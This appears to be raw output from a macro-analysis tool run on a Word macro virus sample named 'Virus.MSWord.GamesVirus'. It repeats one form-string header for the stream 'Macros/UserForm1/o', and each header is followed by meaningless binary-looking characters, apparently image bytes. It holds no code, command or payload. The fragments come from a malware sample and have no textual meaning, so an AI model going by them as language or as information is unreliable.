1I)Ji BY1Ji(Ba)Ja2Rq*Ri)Ji)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja2Rq*Rq2Rq*Ri2Rq2Rq(Ba(Ba BY)Ja)Ji Ba BY)Ja3Zy<c�Dc�2Rq2Rq3Zy3Zy3Zy)Ji)Ji2Ri)Ja)Ji2Rq*Rq3Zq*Ri)Ja1Ji)Ja)Ja1Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q BY1Ji)Ji)Ja)Ja BY(BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ja BY'9Q BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y BY(Ba BY'9Q)Ji*Ri)Ji Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq3Zy3Zy<c�3Zy2Rq2Rq!Ja1Ji2Rq3Zy2Rq Ba)Ji*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY*Ri2Rq)Ji)Ja2Rq1Ja2Ri2Rq BY(BY(Ba)Ja)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q(Ba BY(BY(Ba)Ji2Rq2Rq BQ
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)82Ri;Zy)Ji*Rq3Zy2Rq Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q BY)Ja2Ri)Ji)Ja)Ja)Ja2Rq)Ji(BY1Ji3Zy<c�2Rq(Ba(BY)Ja!Ja(Ba Ba BY)Ja*Ri2Rq;Zy*Ri2Rq1Ji(BY)Ji(Ba BY BY'9Q(Ba)Ja)Ja)Ji)Ja!Ja)Ja)Ji)Ji2Rq)Ji1Ji2Rq*Ri*Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja)Ja2Rq3Zq)Ja(BY!Ja2Rq;Zq*Ri2Rq2Rq3ZyDc�<c�<c�2Rq BY)Ja1Ji3Zq*Ri BY)Ja1Ji!Ja BY Ba Ba)Ji*Ri3Zq)Ji'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ja3Zy3Zq2Rq)Ja)Ji3Zq<cy)Ja)Ja*Ri2Rq*Ri3Zy4c�4c�3Zy BY BY BY BY)Ji BY)Ji BY!Ja*Ri)Ji BY'9Q'9Q'9Q)Ji)Ja BY BY BY)Ja*Ri)Ja'9Q'9Q'9Q(BY)Ji*Ri<c�2Rq)Ji)Ji)Ja)Ja(BY'9Q(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq*Rq)Ja(Ba'9Q'9Q*Rq3Zy;Zy*Ri*Ri)Ja)Ja)Ji)Ja!Ja*Rq)Ja)Ja BY2RiDc�3Zq2Rq;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Q)Ja3Zy)Ji)Ja)Ji!Ja Ba Ba)Ja)Ji*Ri)Ji)Ja)Ja*Ri(Ba)Ja3Zq*Rq*Ri)Ji BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY)Ja)Ja(Ba BY)Ji2Rq)Ja)Ji1Ji)Ji)Ji(Ba(Ba)Ja*Ri2Rq2Rq!Ja(Ba BY BY)Ja)Ja)Ja)Ji Ba(Ba BY*Ri3Zy)Ja)Ja2RiFs�;Zq)Ja3ZqEk�Dcy2Ri)Ja3Zq2Rq2Rq*Ri)Ja(Ba!Ja2Rq3Zy*Rq2Rq*Rq3Zy3Zq(BY BY BY*Ri;Zy3Zy2Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY Ba(Ba BY)Ja)Ja BY(BY BY BQ)Ji2Rq3Zy2Rq)Ji)Ji)Ji BY'9Q BY)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Ji)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y BY)Ji1Jq)Ji)Ji(Ba BY2Rq2Rq2Rq1Ji3Zy<c�Fs�Ek�<c�2Ry)Ji)Jq3Zy3Zy2Rq)Ji)Ji;Zy2Rq)Ja(Ba)Ji2Rq(Ba BY2Rq)Ji)Ja1Jq2Rq2Rq(Ba)Ji1Jq'9Y BY(Ba)Ja)Ja)Ji<c�Dc�;Zy'9Q(Ba3Zq*Ri*Ri)Ji(Ba*Ri<c�Ek�<c�3Zy3Zy*Ri(Ba)Ji)Ji Ba)Ji2Rq;Zy2Rq)Ji)Ja*Ri<c�)Ji2Ri;Zy BY BQ(BY2Ri3Zq<c�)Ji(Ba2Rq*Ri2Rq2Ri2Rq2Rq(Ba2Rq2Rq)Ja(Ba(Bi)Ji2Rq*Ri3Zy;Z�)Ja1Ji2Rq3Zy2Ry3Zq;Zy<c�;ZyDc�;Zy2Rq3Zq)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq3Zy3Zy3Zy2Rq3Zy2Ri)Ji;Zy&1Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2Ri2Rq2Rq)Ji&1Q&1Q)Ji2Rq2Rq*Ri)Ja'9Y)Ja2Ri2Rq)Ja)Ji)Ja BY(Ba)Ji)Ja(Ba(Ba2Rq2Rq)Ja)Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY BY2Rq2Rq3Zq2Rq3Zy2Rq)Ji Ba BY)Ji)Ji)Ji(Ba(Ba<c�<c�<cy2Rq2Ri3Zy;Zy2Rq1Ji2Ri)Ja)Ji*Ri2Rq2Rq)Ja)Ji1Ji)Ja)Ji)Ji BY'9Q BY(Ba1Ji)Ja)Ji)Ja BY(BY'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ji)Ji)Ja'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q(BY(BY(BY(Ba)Ja2Rq1Jq(Ba'9Y)Ji3Zq;Zy3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ji)Ja(Ba Ba Ba(Ba(BY)Ji*Ri*Ri1Ji(Ba Ba2Rq*Ri)Ja)Ji*Ri;Zy2Rq Ba(Ba)Ji)Ji1Jq3Zq2Rq)Ji BY BY BY!Ja2Rq3Zy2Rq1Ji)Ja)Ji)Ji(Ba1Ji)Ji*Ri2Rq)Ji2Rq)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q&1I Ba)Ja(Ba)Ji1Ji1Ji)Ja*Ri3Zy2Rq2Rq<c�<cy3Zy)Ji3Zy3Zy3Zq2Rq*Ri2Rq*Ri Ba BY)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I2Rq)Ja(BY BY)Ji2Rq2Rq)Ji2Ri)Ji2Rq3Zy*Ri)Ji)Ja)Ja BY!Ja*Ry2Rq'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A3Zi4cq*Ri2Rq*Ri2Rq*Ri*Ri<cy3Zq<cy=k�3Zq*Ri Ba*Ri3Zq)Ja)Ji2Rq(Ba2Rq2Rq)Ja(BY BY)Ja'9Y'9Y)Ji2Ry3Zq)Ji)Ji*Ri<cy)Ja)Ja;Zy BY Ba(Ba)Ja3Zy<cy3Zq1Ji'9Q)Ja)Ji)Ja)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(Ba)Ji*Ri)Ja'9I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Y Ba(BY'9Q BQ)Ja*Ri)Ji BY BY BY BY BY2Rq<cy2Rq2Rq*Rq2Rq1Ji BY'9Q'9Q BY2Rq*Ri(Ba)Ja)Ja(BY)Ja)Ji2Rq3Zy3Zq1Ji(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q"Ri3Zy<cy'9Y2RiEk�3Zq3Zy<cy2Ri(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY)Ja*Ri)Ja(BY)Ja*Ri)Ji(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I(BY BY)Ja3Zy*Ri2Rq2Rq!Ja)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja(Ba BY(Ba)Ja)Ja1Ji)Ja)Ji2Rq3Zq(BY(Ba(Ba1Ji BY BY Ba!Ja)Ji2Rq2Ri1Jq)Ji)Ji2Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q1Ji2Rq*Ri)Ja)Ja)Ja;Zq Ba'9Y(Ba)Ja1Ji2Rq)Ji1Ji)Ji(Ba)Ja1Ji2Rq2Rq)Ji)Ja)Ja)Ja2Rq2Rq2Rq)Ji(Ba)Ji)Ji2Rq)Ji)Ja*Ri2Rq)Ja2Rq;Zy2Ri3Zy3Zy2Rq2Rq2Ri*Ri(Ba)Ja2Rq3Zy)Ji)Ja)Ja Ba BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y3Zy<c�2Rq3Z�3Z�3Zq Ba)Ja)Ji1Ji(Ba(Ba BY'9Q(Ba)Ji)Ji3Zy3Zy3Zy3Zy3Zy2Ry2Ry3Zy<c�<c�<c�<c�2Ry1Ji(Ba)Ja2Rq;Zy2Rq2Rq<c�2Rq(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q2Rq2Rq)Ja(BY)Ja*Ri2Rq2Rq3Zy3Zy2Rq2Rq2Rq)Ji(Ba BY(Ba*Rq-k�3Zy2Rq*Ri3Zq<cqEky3Zq3Zi)Ja3Zq2Rq2Rq2Rq(Ba)Ji3Zy*Ri2Rq3Zy)Ji)Ji(BY(Ba)Ji;Zy;Zy2Rq)Ji2Rq)Ja(BY(BY)Ja3ZqEk�)Ji'9Y2Rq)Ji)Ji)Ji2Rq2Rq BY2Rq)Ja'9Y(Ba Ba(Ba(Ba)Ji3Zy)Ji*Ri2Rq2Ri2Rq3Zy3Zy<c�Dc�3Zq2Rq3Zq<c�*Ri)Ji2Rq2Rq2Ri2Rq3Zy2Rq3Zy<c�(Ba&1I(BY2Rq2Rq*Ri'9Q'9Y)Ji2Rq*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 Ba BY(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY)Ja)Ja BY(Ba2Rq3Zy)Ja)Ji*Rq2Rq)Ji)Ja2Rq3Zy2Rq)Ji BY Ba(Ba'9Q)Ja)Ji Ba2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q)Ji3Zy1Ji)Ja)Ji2Rq>s�=k�*Ri BY)Ji)Ji)Ji*Ri)Ji2Rq Ba(Ba)Ji BY!Ja)Ji'9Q)Ji1Ji)Ji)Ja(Ba(Ba)Ji3Zy;Zy2Ri*Ri)Ji Ba(Ba2Rq3Zq*Ri'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)I BY)Ji*Rq2Rq BY BY(Ba)Ja2Rq2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y(Ba)Ji)Ja(Ba)Ja*Ri&1I
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I'9Q'9Q*Ri2Rq)Ji)Ji)Ja)Ja)Ji2Rq2Ri3Zy2Rq*Rq4cy*Ri)Ji2Rq*Rq)Ji)Ji(Ba1Ji)Ji2Rq;Zy*Rq)Ja Ba BY(Ba)Ji2Rq;Zy*Ri3Zq3Zq)Ja2Rq<cy4cq)Ja)Ji*Ri2Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ba Ba Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY Ba BY Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q3Zy2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY*Ri)Ji1Ji)Ja Ba2Rq4cy2Rq*Rq*Ri1Ji(Ba Ba)Ja BY)Ji2Rq3ZqFs�3Zq(Ba<c�*Rq2Ri<cy3Zq<c�<c�*Ri)Ja)Ji*Rq2Rq3ZqDc�<c�*Rq)Ja*Rq2Rq2Rq*Ri3Zy<c�<c�<c�3Zy2Rq3Z�)Ji'9Q1Ji BY(Ba)Ja)Ji2Rq2Rq)Ja(Ba(Ba'9Y Ba)JiDc�;Zy)Ja)Ja3Zq3Zq)Ja2Rq)Ji BY BY)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3Zy*Rq)Ji)Ji)Ja)Ji)Ja)Ja2Rq)Ji)Ja)Ja)Ja2Rq3Zq;Zy<c�3Zy)Ji)Ji BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY)Ja)Ji;Zy2Ri'9Q(BY)Ji!Ja'9Q BY BY(BY*Ri2Ry3Zy3Zq*Ri)Ji)Ja)Ja Ba(Ba(Ba'9Q)Ji)Ji)Ja(Ba BY BY BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I Ba)Ji)Ja BY'9Q BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Q'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY(BY BY)Ja2Rq*Ri)Ji1Ji*Ri2Rq3Zy3Zq2Ri BQ'9Q Ba)Ja1Ji)Ja(Ba(Ba(BY BY)Ji*Ri)Ji)Ji)Ji)Ji)Ja)Ja2Rq*Rq*Ri2Rq3Zy<c�2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I BY)Ji*Ri*Ri)Ja(Ba)Ja)Ji)Ji)Ji)Ji(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q)Ji*Ri)Ji(Ba&1Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY*Rq)Ji(Ba'9Q
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BQ)Ja2Ri3Zq*Ri)Ji)Ji)Ja)Ja*Ri3Zy)Ji)Ji!Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
BY!Ja+ZqDc�<cy+Zq3Zy*Ri
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Y)Ja
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q'9Y'9Y BY)Ja*Ri*Ri2Rq*Ri2Ri2Ri*Rq2Rq*Ri)Ji1Ji)Ja Ba)Ja Ba BY BY Ba)Ji3Zq+Zq3Zq3ZqDc�<c�*Ri)Ja*Ri Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I)Ji2Ri*Ri3Zy)Ji BY2Rq3Zq2Rq2Rq*Rq2Ri2Rq,cyFs�*Ri)Ja4cy*Ri(Ba Ba)Ji)Ja(Ba)Ja2Rq3Zq2Rq BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A(BY2Rq2Rq;Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)Ja2Rq3Zq;Zy2Rq<c�<c�)Ji)Ji(Ba BY1Ji2Rq*Ri)Ji(BY(BY(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A)Ji2Rq)Ji BY2Rq2Rq)Ja)Ja1Ji2Rq:Rq1Ji)Ja2Ri2Rq)Ji2Rq2Rq)Ji1Jq BY1Ji;Zy2Rq2Rq;ZyEk�2Ri'9Y)Ja3Zq*Ri)Ja(BaEk�3Zy;Zy3Zy
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
)A'9Y)Ji3Zy)Ja)Ja(BY2Rq(Ba Ba2Rq2Rq)Ji)Ja)Ji2Rq)Ji(Ba)Ja3Zy2Ry3Zy<cy<c�)Ja BY2Ri*Ri*Ri1Ji(Ba)Ji1Ji2Rq;Zy)Ja)Ja2Rq*Rq)Ji)Ji)Ja)Ji BY'9Q)Ja)Ji)Ji)Ji(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Q BY)Ji2Rq*Ri)Ji Bi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Y BY BY)Ja2Ri3Zq<c�=ky<c�<c�*Rq(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ji"Ra)Ji)Ji2Rq2Rq*Ri!Ji!Ja!Ja BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q(BY2Rq2Ri)Ji)Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1Q'9Q(Ba Ba*Rq3Zq3Zq*Rq Ba(BY BY BY)Ja)Ji3Zq3Zy2Ry4c�2Rq Ba Ba(Ba(Ba)Ji)Ji)Ji'9Y BY2RqEk�3Zy3Zq;Zy1Ji)Ji)Ji<cy(Ba*Ri3ZyEk�2Ri)Ji2Rq=ky2Rq;Zy<c�Dc� BY BY2Rq)JiDc�Ek�;Zy Ba)Ja2Ri2Rq(Ba)Ja)Ja(BY(Bi*Rq2Rq1Ji
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9Q BY1Ji BY)Ja1Ji2Rq2Rq2Rq2Ri2Rq2Rq
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
*Ri*Rq2Rq)Ji)Ji)Ji BY BY&1Q(Ba)Ja BY BY2Ri*Ri)Ji(Ba)Ja)Ja(Ba
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
1I!Ja)Ji)Ji)Ja2Rq)Ji BY2Rq'9Q'9Q BY BY'9Q'9Q BY)Ji1Ji BY)Ja*Ri*Rq3Zy*Ri(Ba'9Y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
9I BY)Ja*Ri2Ri3Zq=kyEk�2Rq;Zy<cy)Ja)Ja3Zq3Zq(BY
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.GamesVirus' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
